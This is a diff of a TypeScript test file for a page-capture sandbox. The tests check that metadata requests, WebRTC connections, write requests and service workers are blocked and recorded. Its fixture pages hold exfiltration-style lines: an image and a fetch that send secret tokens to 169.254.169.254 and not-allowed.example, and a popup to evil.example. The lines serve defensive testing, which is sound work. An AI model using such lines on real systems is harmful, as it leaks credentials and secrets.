@@ -19,9 +19,12 @@ const sandbox: Sandbox = { up: async () => ({ exitCode: 0, output: "" }), down: 
 
 let srv: http.Server, port = 0;
 const hits: string[] = [];
+const methods: string[] = [];
+let rtcPort = 0;
 beforeAll(async () => {
   srv = http.createServer((req, res) => {
     hits.push(req.url ?? "");
+    methods.push(`${req.method} ${req.url}`);
     const html = (b: string) => { res.writeHead(200, { "content-type": "text/html" }); res.end(b); };
     if (req.url === "/attack") return html(`<!doctype html><h1>attack page</h1>
 <img id="meta" src="http://169.254.169.254/latest/meta-data/iam.png?token=${SECRETS.q}">
@@ -35,6 +38,25 @@ fetch("http://not-allowed.example/api?api_key=${SECRETS.key}&page=${SECRETS.plai
 try { new WebSocket("ws://demo.local:${port}/ws"); } catch (e) {}
 setTimeout(() => window.open("http://evil.example/popup"), 10);
 </script>`);
+    if (req.url === "/rtc") return html(`<h1>rtc page</h1><p id="r">rtc:pending</p><iframe srcdoc="<p>child</p>"></iframe><script>
+const out = [];
+for (const C of [window.RTCPeerConnection, window.webkitRTCPeerConnection, document.querySelector("iframe").contentWindow.RTCPeerConnection]) {
+  try { const pc = new C({ iceServers: [{ urls: "stun:127.0.0.2:${rtcPort}" }, { urls: "turn:127.0.0.2:${rtcPort}?transport=tcp", username: "u", credential: "c" }] });
+        pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)); out.push("OPEN"); }
+  catch (e) { out.push("blocked"); }
+}
+document.getElementById("r").textContent = "rtc:" + out.join(",");
+</script>`);
+    if (req.url === "/writes") return html(`<h1>writes page</h1><iframe name="f"></iframe>
+<form method="post" action="/w-form" target="f"><input name="a" value="1"></form>
+<script>
+document.forms[0].submit();
+fetch("/w-post", { method: "POST", body: "x" }).catch(() => {});
+fetch("/w-del", { method: "DELETE" }).catch(() => {});
+fetch("/w-put", { method: "PUT", body: "y" }).catch(() => {});
+fetch("/w-get").catch(() => {});
+</script>`);
+    if (req.url === "/ui") return html(`<h1>订单列表</h1><img src="http://169.254.169.254/latest/meta-data/ui.png">`);
     if (req.url === "/sw-page") return html(`<h1>sw page</h1><p id="r">sw:pending</p><script>
 navigator.serviceWorker ? navigator.serviceWorker.register("/sw.js").then(() => { document.getElementById("r").textContent = "sw:REGISTERED"; }, (e) => { document.getElementById("r").textContent = "sw:rejected"; })
   : (document.getElementById("r").textContent = "sw:unavailable");
@@ -74,6 +96,7 @@ describe("capture_page blocks every bypass (real Chromium)", () => {
     expect(evs.map((e) => e.path)).toEqual(expect.arrayContaining([expect.stringMatching(/\.har$/)]));
     const blockedEv = evs.find((e) => e.kind === "blocked")!;
     expect(blockedEv).toBeDefined();
+    expect(blockedEv.type).toBe("blocked");
     const doc = JSON.parse(readFileSync(join(core.dir(id), blockedEv.path), "utf8"));
     const find = (re: RegExp) => doc.blocked.find((b: { url: string }) => re.test(b.url));
     expect(find(/169\.254\.169\.254\/latest\/meta-data\/iam/)).toMatchObject({ type: "image", reason: expect.stringMatching(/metadata/) });
@@ -132,6 +155,76 @@ describe("service workers", () => {
     expect(hits.slice(before)).not.toContain("/sw.js");
     const b = evs.find((e) => e.kind === "blocked")!;
     expect(JSON.parse(readFileSync(join(core.dir(id), b.path), "utf8")).blocked).toEqual(expect.arrayContaining([expect.objectContaining({ type: "serviceworker", url: expect.stringMatching(/\/sw\.js$/) })]));
+  }, 90_000);
+});
+
+describe("WebRTC", () => {
+  it.skipIf(!hasChromium)("RTCPeerConnection (top frame, webkit alias, child frame) throws, is recorded, and nothing reaches a denied IP over UDP or TCP", async () => {
+    const dgram = await import("node:dgram");
+    const net = await import("node:net");
+    let udp = 0, tcp = 0;
+    const u = dgram.createSocket("udp4");
+    u.on("message", () => { udp++; });
+    await new Promise<void>((r) => u.bind(0, "127.0.0.2", r));
+    rtcPort = u.address().port;
+    const t = net.createServer((c) => { tcp++; c.destroy(); });
+    await new Promise<void>((r) => t.listen(rtcPort, "127.0.0.2", r));
+    try {
+      const { core } = mk(async () => "127.0.0.1");
+      const id = await planned(core);
+      const evs = await core.capturePage(id, { checkId: "p", url: `http://demo.local:${port}/rtc` });
+      await new Promise((r) => setTimeout(r, 1500)); // ICE gathering would have sent by now
+      const text = readFileSync(join(core.dir(id), evs.find((e) => e.kind === "http")!.path), "utf8");
+      expect(text).toContain("rtc:blocked,blocked,blocked");
+      expect(text).not.toContain("OPEN");
+      expect(udp).toBe(0);
+      expect(tcp).toBe(0);
+      const b = evs.find((e) => e.type === "blocked")!;
+      const list = JSON.parse(readFileSync(join(core.dir(id), b.path), "utf8")).blocked as { type: string; url: string }[];
+      expect(list.filter((x) => x.type === "webrtc").length).toBeGreaterThanOrEqual(3);
+      expect(list.find((x) => x.type === "webrtc")!.url).toMatch(/RTCPeerConnection stun:127\.0\.0\.2/);
+    } finally { u.close(); t.close(); }
+  }, 90_000);
+});
+
+describe("read-only by default", () => {
+  it.skipIf(!hasChromium)("form POST and fetch POST/PUT/DELETE are blocked + recorded and never reach the server; GET still works", async () => {
+    const { core } = mk(async () => "127.0.0.1");
+    const id = await planned(core);
+    const before = methods.length;
+    const evs = await core.capturePage(id, { checkId: "p", url: `http://demo.local:${port}/writes` });
+    const seen = methods.slice(before);
+    expect(seen).toContain("GET /w-get");
+    expect(seen.filter((m) => !m.startsWith("GET ") && !m.startsWith("HEAD "))).toEqual([]);
+    expect(seen.some((m) => m.includes("/w-"))).toBe(true);
+    expect(seen.filter((m) => /\/w-(form|post|del|put)/.test(m))).toEqual([]);
+    const b = evs.find((e) => e.type === "blocked")!;
+    const list = JSON.parse(readFileSync(join(core.dir(id), b.path), "utf8")).blocked as { method: string; url: string; reason: string }[];
+    for (const [m, path] of [["POST", "/w-form"], ["POST", "/w-post"], ["DELETE", "/w-del"], ["PUT", "/w-put"]]) {
+      expect(list.find((x) => x.method === m && x.url.endsWith(path)), `${m} ${path}`).toMatchObject({ reason: expect.stringMatching(/read-only/) });
+    }
+  }, 90_000);
+});
+
+describe("blocked evidence is its own type", () => {
+  it.skipIf(!hasChromium)("type 'blocked' (not response); ui text checks ignore it — it can neither satisfy nor fail them", async () => {
+    const { core } = mk(async () => "127.0.0.1");
+    const w = core.startWalkthrough({ title: "t", sandbox: SB });
+    const ui = (id: string, contains: string) => ({ id, intent: id, method: "ui" as const, target: "x", expect: { type: "ui" as const, value: { text: { contains } } }, severity_if_fail: "high" as const });
+    await core.planChecks(w.id, { goal: "g", checks: [ui("page-text", "订单列表"), ui("blocked-text", "meta-data")] });
+    const a = await core.capturePage(w.id, { checkId: "page-text", url: `http://demo.local:${port}/ui` });
+    const blockedEv = a.find((e) => e.kind === "blocked")!;
+    expect(blockedEv.type).toBe("blocked");
+    expect(a.filter((e) => e.type === "response").map((e) => e.kind)).toEqual(["http"]);
+    // page text present + one blocked request: submitting ALL capture evidence passes (blocked JSON is not judged)
+    const pt = await core.evaluateCheck(w.id, { checkId: "page-text", evidenceIds: a.map((e) => e.id) });
+    expect(pt.status, JSON.stringify(pt)).toBe("pass");
+    // text that appears ONLY in the blocked record (its URL) must not satisfy a ui text check
+    const b = await core.capturePage(w.id, { checkId: "blocked-text", url: `http://demo.local:${port}/ui` });
+    const onlyBlocked = await core.evaluateCheck(w.id, { checkId: "blocked-text", evidenceIds: [b.find((e) => e.type === "blocked")!.id] });
+    expect(onlyBlocked.status).not.toMatch(/^pass/);
+    const all = await core.evaluateCheck(w.id, { checkId: "blocked-text", evidenceIds: b.map((e) => e.id) });
+    expect(all.status).not.toMatch(/^pass/);
   }, 90_000);
 });
 
